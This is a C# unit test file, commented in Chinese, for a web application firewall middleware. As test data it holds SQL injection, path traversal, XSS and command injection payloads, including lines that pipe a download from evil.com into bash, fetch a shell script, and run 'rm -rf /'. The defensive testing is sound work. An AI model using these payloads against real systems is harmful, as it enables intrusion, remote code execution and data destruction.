using EquipAI.Infrastructure.Middleware;
using FluentAssertions;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;
using Moq;
using System.Collections.Immutable;

namespace EquipAI.Tests.Unit.Middleware;

/// <summary>
/// WafMiddleware 单元测试
///
/// WAF 是项目的最后一道安全防线（其他 Middleware 都有测试，唯独这个没测），
/// 漏报会导致 SQL 注入等攻击成功，误报会拦截正常业务请求。
///
/// 测试维度：
/// 1. IsMalicious 静态方法白盒测试 — 四类攻击 payload 各覆盖多种变体
/// 2. InvokeAsync 端到端 — 恶意请求返回 403 不调下游；正常请求放行
/// 3. 边界：空字符串、合法业务字段（防误报）
/// </summary>
public class WafMiddlewareTests
{
    private readonly Mock<RequestDelegate> _nextMock = new();
    private readonly Mock<ILogger<WafMiddleware>> _loggerMock = new();
    private readonly WafMiddleware _middleware;

    public WafMiddlewareTests()
    {
        var provider = new Mock<IWafRuleProvider>();
        provider.SetupGet(value => value.Current).Returns(CreateSnapshot());
        _middleware = new WafMiddleware(_nextMock.Object, _loggerMock.Object, provider.Object);
    }

    // =========================================================================
    // SQL 注入检测 — 锁定 SQL 注入 payload 必被识别
    // =========================================================================

    /// <summary>
    /// SQL 注入常见 payload 集合 — 每个都应被 IsMalicious 识别为 true
    ///
    /// 数据来源：OWASP SQL Injection Cheat Sheet 中的经典 payload
    /// </summary>
    [Theory]
    [InlineData("' UNION SELECT * FROM users --")]                 // 联合查询注入
    [InlineData("' or 1=1")]                                       // 布尔盲注（无引号形式）
    [InlineData("admin' OR 1=1 --")]                               // 经典登录绕过
    [InlineData("1 AND 1=1")]                                       // AND 布尔盲注
    [InlineData("1; DROP TABLE users")]                           // 破坏性语句
    [InlineData("1; DELETE FROM users WHERE 1=1")]                // 删除数据
    [InlineData("1; UPDATE users SET role='admin'")]              // 提权
    [InlineData("EXEC xp_cmdshell 'dir'")]                        // SQL Server 命令执行
    [InlineData("' UNION SELECT * FROM information_schema.tables")] // 元数据枚举
    [InlineData("1; SELECT SLEEP(5)")]                            // 时间盲注（MySQL）
    [InlineData("1 AND BENCHMARK(5000000, MD5('x'))")]           // 时间盲注（压测）
    public void IsMalicious_SQL注入payload集合_全部识别为恶意(string payload)
    {
        WafMiddleware.IsMalicious(payload).Should().BeTrue(
            $"SQL 注入 payload '{payload}' 应被 WAF 识别并拦截");
    }

    // =========================================================================
    // 路径遍历检测
    // =========================================================================

    [Theory]
    [InlineData("../../etc/passwd")]                              // Unix 路径回溯
    [InlineData("..\\..\\windows\\system32")]                     // Windows 路径回溯
    [InlineData("%2e%2e%2f%2e%2e%2fetc%2fpasswd")]                // URL 编码绕过
    [InlineData("/etc/passwd")]                                   // 直接访问敏感文件
    [InlineData("/etc/shadow")]                                   // 密码哈希文件
    [InlineData("/proc/self/environ")]                            // 进程环境变量
    public void IsMalicious_路径遍历payload集合_全部识别为恶意(string payload)
    {
        WafMiddleware.IsMalicious(payload).Should().BeTrue(
            $"路径遍历 payload '{payload}' 应被 WAF 识别并拦截");
    }

    // =========================================================================
    // 命令注入检测
    // =========================================================================

    [Theory]
    [InlineData("foo || rm -rf /")]                              // 管道符链接命令
    [InlineData("hello; curl http://evil.com | bash")]           // 分号截断 + curl
    [InlineData("`whoami`")]                                      // 反引号命令替换
    [InlineData("$(id)")]                                         // $() 命令替换
    [InlineData("foo; cat /etc/passwd")]                         // 分号 + cat 敏感文件
    [InlineData("foo; wget http://evil.com/shell.sh")]           // wget 下载恶意脚本
    public void IsMalicious_命令注入payload集合_全部识别为恶意(string payload)
    {
        WafMiddleware.IsMalicious(payload).Should().BeTrue(
            $"命令注入 payload '{payload}' 应被 WAF 识别并拦截");
    }

    // =========================================================================
    // XSS 检测（通过 InputSanitization 的 ContainsMaliciousContent）
    // =========================================================================

    [Theory]
    [InlineData("<script>alert('xss')</script>")]                // 经典 script 标签
    [InlineData("<img src=x onerror=alert(1)>")]                 // onerror 事件
    [InlineData("<button onclick=alert(1)>click</button>")]      // onclick 事件
    [InlineData("<input onfocus=alert(1) autofocus>")]           // onfocus 事件
    [InlineData("<a href=\"javascript:alert(1)\">x</a>")]       // javascript: 协议
    public void IsMalicious_XSSpayload集合_全部识别为恶意(string payload)
    {
        WafMiddleware.IsMalicious(payload).Should().BeTrue(
            $"XSS payload '{payload}' 应被 WAF 识别并拦截");
    }

    // =========================================================================
    // 误报防护 — 合法业务请求必须放行（false negative 防护）
    // =========================================================================

    /// <summary>
    /// 关键测试：合法业务字段不应触发 WAF 拦截
    ///
    /// 重点风险：on\w+= 正则会误伤含 "on" 的字段名（如 onlyOnly=true），
    /// 注释符 -- 可能误伤 dash 分隔的合法字符串。WAF 误报会直接拦截正常业务请求。
    /// </summary>
    [Theory]
    [InlineData("/api/v1/devices?page=1&pageSize=20")]            // 分页参数
    [InlineData("/api/v1/devices?search=pump&status=online")]     // 多参数查询
    [InlineData("{\"name\":\"设备-001\",\"type\":\"泵\"}")]         // 正常中文 JSON
    [InlineData("{\"deviceCode\":\"DEV-001\",\"criticality\":\"normal\"}")]
    [InlineData("description=This is a normal description.")]     // 含句点但合法
    [InlineData("{\"comment\":\"user--admin\"}")]                 // 含双连字符但合法
    [InlineData("{\"title\":\"5 > 3 and 2 < 4\"}")]               // 含 > and < 比较符
    [InlineData("/api/v1/alerts?severity=high&acknowledgedOnly=true")] // only 字段
    public void IsMalicious_合法业务请求_不应误报(string payload)
    {
        WafMiddleware.IsMalicious(payload).Should().BeFalse(
            $"合法请求 '{payload}' 不应被 WAF 误判为恶意");
    }

    [Theory]
    [InlineData("")]
    [InlineData(" ")]
    [InlineData("normal text without any pattern")]
    public void IsMalicious_空值和纯文本_返回false(string payload)
    {
        WafMiddleware.IsMalicious(payload).Should().BeFalse();
    }

    // =========================================================================
    // InvokeAsync 端到端 — URL 恶意请求返回 403 不调下游
    // =========================================================================

    /// <summary>
    /// 恶意 URL 应直接返回 403，不调用下游中间件
    /// </summary>
    [Fact]
    public async Task InvokeAsync_URL含SQL注入_返回403_不调用下游()
    {
        // Arrange：构造含 SQL 注入的 URL
        var context = new DefaultHttpContext();
        context.Request.Method = "GET";
        context.Request.Path = "/api/v1/users";
        context.Request.QueryString = new QueryString("?id=1 UNION SELECT * FROM users");

        // Act
        await _middleware.InvokeAsync(context);

        // Assert
        context.Response.StatusCode.Should().Be(StatusCodes.Status403Forbidden,
            "SQL 注入 URL 必须返回 403 拦截");
        _nextMock.Verify(n => n(It.IsAny<HttpContext>()), Times.Never,
            "恶意请求不应流转到下游中间件");
    }

    /// <summary>
    /// 恶意 POST body 应返回 403，不调用下游
    /// </summary>
    [Fact]
    public async Task InvokeAsync_POST请求体含XSS_返回403_不调用下游()
    {
        var context = new DefaultHttpContext();
        context.Request.Method = "POST";
        context.Request.Path = "/api/v1/devices";
        context.Request.ContentType = "application/json";
        var bodyBytes = System.Text.Encoding.UTF8.GetBytes("{\"name\":\"<script>alert(1)</script>\"}");
        context.Request.Body = new MemoryStream(bodyBytes);
        context.Request.ContentLength = bodyBytes.Length;

        await _middleware.InvokeAsync(context);

        context.Response.StatusCode.Should().Be(StatusCodes.Status403Forbidden);
        _nextMock.Verify(n => n(It.IsAny<HttpContext>()), Times.Never);
    }

    /// <summary>
    /// 正常 GET 请求应放行到下游
    /// </summary>
    [Fact]
    public async Task InvokeAsync_正常GET请求_放行到下游()
    {
        var context = new DefaultHttpContext();
        context.Request.Method = "GET";
        context.Request.Path = "/api/v1/devices";
        context.Request.QueryString = new QueryString("?page=1&pageSize=20");

        await _middleware.InvokeAsync(context);

        context.Response.StatusCode.Should().Be(StatusCodes.Status200OK, "正常请求应放行不改状态码");
        _nextMock.Verify(n => n(It.IsAny<HttpContext>()), Times.Once, "正常请求应调用下游一次");
    }

    /// <summary>
    /// 正常 POST JSON 应放行到下游，且请求体可被下游读取（位置已重置）
    /// </summary>
    [Fact]
    public async Task InvokeAsync_正常POST请求_放行到下游_请求体可重读()
    {
        var context = new DefaultHttpContext();
        context.Request.Method = "POST";
        context.Request.Path = "/api/v1/devices";
        context.Request.ContentType = "application/json";
        var bodyBytes = System.Text.Encoding.UTF8.GetBytes("{\"name\":\"泵-001\",\"type\":\"pump\"}");
        context.Request.Body = new MemoryStream(bodyBytes);
        context.Request.ContentLength = bodyBytes.Length;

        await _middleware.InvokeAsync(context);

        _nextMock.Verify(n => n(It.IsAny<HttpContext>()), Times.Once);
        context.Request.Body.Position.Should().Be(0,
            "WAF 检查后应重置 Body 位置，让下游 Controller 能读取");
    }

    /// <summary>
    /// 非 JSON Content-Type 的 POST 应跳过 body 检查（如 multipart/form-data 上传文件）
    ///
    /// Why：文件上传是合法场景，且二进制内容可能误触发正则（如 PDF 内嵌文本）
    /// </summary>
    [Fact]
    public async Task InvokeAsync_非JSON的POST_跳过请求体检查_仅检查URL()
    {
        var context = new DefaultHttpContext();
        context.Request.Method = "POST";
        context.Request.Path = "/api/v1/upload";
        context.Request.ContentType = "multipart/form-data";
        context.Request.Body = new MemoryStream(System.Text.Encoding.UTF8.GetBytes("binary content here"));

        await _middleware.InvokeAsync(context);

        _nextMock.Verify(n => n(It.IsAny<HttpContext>()), Times.Once,
            "非 JSON POST 应跳过 body 检查直接放行（URL 无恶意模式）");
    }

    /// <summary>
    /// 拒绝消息格式：返回 JSON 错误结构（前端可解析）
    /// </summary>
    [Fact]
    public async Task InvokeAsync_拦截时返回结构化JSON错误()
    {
        var context = new DefaultHttpContext();
        context.Request.Method = "GET";
        context.Request.Path = "/api/v1/foo";
        context.Request.QueryString = new QueryString("?id=1; DROP TABLE users");

        // 拦截 Response 写入内存流，便于断言
        context.Response.Body = new MemoryStream();

        await _middleware.InvokeAsync(context);

        context.Response.ContentType.Should().Contain("application/json");
        context.Response.Body.Position = 0;
        using var reader = new StreamReader(context.Response.Body);
        var body = await reader.ReadToEndAsync();
        body.Should().Contain("\"code\":403", "拦截响应应含统一错误码");
        body.Should().Contain("请求被安全策略拦截", "拦截响应应含可读消息");
    }

    /// <summary>
    /// 外部字面量规则命中 URL 时应和内置规则一样阻断请求。
    /// </summary>
    [Fact]
    public async Task InvokeAsync_外部contains规则命中URL_返回403()
    {
        var next = new Mock<RequestDelegate>();
        var provider = new Mock<IWafRuleProvider>();
        provider.SetupGet(value => value.Current).Returns(CreateSnapshot(
            new WafCompiledRule(
                "custom-rule",
                "sql-injection",
                "测试扩展规则",
                input => input.Contains("new-attack-marker", StringComparison.OrdinalIgnoreCase))));
        var middleware = new WafMiddleware(next.Object, _loggerMock.Object, provider.Object);
        var context = new DefaultHttpContext();
        context.Request.Path = "/api/v1/devices";
        context.Request.QueryString = new QueryString("?search=new-attack-marker");

        await middleware.InvokeAsync(context);

        context.Response.StatusCode.Should().Be(StatusCodes.Status403Forbidden);
        next.Verify(value => value(It.IsAny<HttpContext>()), Times.Never);
    }

    /// <summary>
    /// 外部规则命中请求体时应阻断，并且结构化日志不得包含请求正文。
    /// </summary>
    [Fact]
    public async Task InvokeAsync_外部规则命中请求体_日志只包含规则标识不包含正文()
    {
        var next = new Mock<RequestDelegate>();
        var logger = new Mock<ILogger<WafMiddleware>>();
        var provider = new Mock<IWafRuleProvider>();
        provider.SetupGet(value => value.Current).Returns(CreateSnapshot(
            new WafCompiledRule(
                "custom-body-rule",
                "xss",
                "测试请求体规则",
                input => input.Contains("new-attack-marker", StringComparison.OrdinalIgnoreCase))));
        var middleware = new WafMiddleware(next.Object, logger.Object, provider.Object);
        var context = new DefaultHttpContext();
        context.Request.Method = "POST";
        context.Request.Path = "/api/v1/devices";
        context.Request.ContentType = "application/json";
        var body = "{\"name\":\"new-attack-marker\",\"secret\":\"secret-body-payload\"}";
        var bodyBytes = System.Text.Encoding.UTF8.GetBytes(body);
        context.Request.Body = new MemoryStream(bodyBytes);
        context.Request.ContentLength = bodyBytes.Length;

        await middleware.InvokeAsync(context);

        context.Response.StatusCode.Should().Be(StatusCodes.Status403Forbidden);
        var logState = logger.Invocations
            .Select(invocation => invocation.Arguments[2]?.ToString())
            .Single(state => state?.Contains("custom-body-rule", StringComparison.Ordinal) == true);
        logState.Should().Contain("custom-body-rule");
        logState.Should().NotContain("secret-body-payload");
        logState.Should().NotContain("new-attack-marker");
    }

    private static WafRuleSnapshot CreateSnapshot(params WafCompiledRule[] externalRules)
        => new(
            "test",
            "test",
            WafRuleCatalog.CreateBuiltInRules().AddRange(externalRules),
            DateTimeOffset.UtcNow);
}
